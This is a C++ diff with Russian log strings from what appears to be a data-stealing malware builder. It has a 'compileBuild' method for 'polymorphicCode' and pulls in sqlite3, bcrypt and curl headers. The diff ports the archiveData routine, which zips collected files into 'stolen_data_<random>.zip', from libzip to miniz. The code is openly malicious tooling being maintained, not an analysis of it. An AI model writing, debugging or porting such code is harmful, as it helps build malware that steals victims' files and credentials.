@@ -40,7 +40,6 @@
 #include <fstream>
 #include <windows.h>
 #include <bcrypt.h>
-#include <zip.h>
 #include <sqlite3.h>
 #include <curl/curl.h>
 #include <shlwapi.h>
@@ -1581,6 +1580,8 @@ bool MainWindow::compileBuild(const std::string& polymorphicCode, const std::str
 }
 
 // Реализация archiveData
+#include "miniz.h"
+
 std::string MainWindow::archiveData(const std::string& dir, const std::vector<std::string>& files) {
     emitLog("Создание ZIP-архива в директории: " + QString::fromStdString(dir));
 
@@ -1590,15 +1591,11 @@ std::string MainWindow::archiveData(const std::string& dir, const std::vector<st
     }
 
     std::string zipPath = dir + "\\stolen_data_" + generateRandomString(8) + ".zip";
-    zip_error_t err;
-    zip_error_init(&err); // Инициализация структуры ошибки
+    mz_zip_archive zip_archive;
+    memset(&zip_archive, 0, sizeof(zip_archive));
 
-    // Открываем архив без третьего аргумента, ошибки будем получать через zip_get_error
-    zip_t* zip = zip_open(zipPath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, nullptr);
-    if (!zip) {
-        zip_error_t* zipErr = zip_get_error(zip); // Получаем ошибку, если zip == nullptr
-        emitLog("Ошибка: Не удалось создать ZIP-архив: " + QString(zip_error_strerror(zipErr)));
-        zip_error_fini(&err);
+    if (!mz_zip_writer_init_file(&zip_archive, zipPath.c_str(), 0)) {
+        emitLog("Ошибка: Не удалось создать ZIP-архив: " + QString::fromStdString(zipPath));
         return "";
     }
 
@@ -1609,18 +1606,9 @@ std::string MainWindow::archiveData(const std::string& dir, const std::vector<st
             continue;
         }
 
-        zip_source_t* source = zip_source_file(zip, filePath.c_str(), 0, -1);
-        if (!source) {
-            emitLog("Ошибка создания источника для файла " + QString::fromStdString(filePath) + ": " +
-                    QString(zip_error_strerror(zip_get_error(zip))));
-            continue;
-        }
-
         std::string fileName = std::filesystem::path(filePath).filename().string();
-        if (zip_file_add(zip, fileName.c_str(), source, ZIP_FL_OVERWRITE) < 0) {
-            emitLog("Ошибка добавления файла в архив: " + QString::fromStdString(fileName) + ": " +
-                    QString(zip_error_strerror(zip_get_error(zip))));
-            zip_source_free(source);
+        if (!mz_zip_writer_add_file(&zip_archive, fileName.c_str(), filePath.c_str(), nullptr, 0, MZ_DEFAULT_COMPRESSION)) {
+            emitLog("Ошибка: Не удалось добавить файл в ZIP: " + QString::fromStdString(filePath));
             continue;
         }
         hasFiles = true;
@@ -1628,21 +1616,17 @@ std::string MainWindow::archiveData(const std::string& dir, const std::vector<st
 
     if (!hasFiles) {
         emitLog("Ошибка: Нет файлов для добавления в ZIP-архив");
-        zip_discard(zip);
-        zip_error_fini(&err);
+        mz_zip_writer_end(&zip_archive);
         return "";
     }
 
-    // Закрываем архив и проверяем ошибки
-    if (zip_close(zip) < 0) {
-        zip_error_t* zipErr = zip_get_error(zip); // Получаем ошибку до освобождения
-        emitLog("Ошибка закрытия ZIP-архива: " + QString(zip_error_strerror(zipErr)));
-        zip_discard(zip); // Используем discard, так как zip_close не удался
-        zip_error_fini(&err);
+    if (!mz_zip_writer_finalize_archive(&zip_archive)) {
+        emitLog("Ошибка: Не удалось завершить ZIP-архив");
+        mz_zip_writer_end(&zip_archive);
         return "";
     }
 
-    zip_error_fini(&err); // Очистка структуры ошибки
+    mz_zip_writer_end(&zip_archive);
     emitLog("ZIP-архив успешно создан: " + QString::fromStdString(zipPath));
     return zipPath;
 }
